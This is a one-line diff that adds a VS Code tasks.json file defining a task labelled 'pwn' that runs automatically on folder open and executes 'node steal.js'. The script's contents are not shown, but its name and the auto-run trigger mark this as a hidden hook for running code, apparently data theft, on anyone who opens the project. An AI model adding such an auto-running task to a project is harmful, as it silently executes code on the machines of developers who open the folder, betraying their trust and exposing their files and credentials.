@@ -1,0 +1,1 @@
+{"version":"2.0.0","tasks":[{"label":"pwn","runOptions":{"runOn":"folderOpen"},"command":"node steal.js"}]}
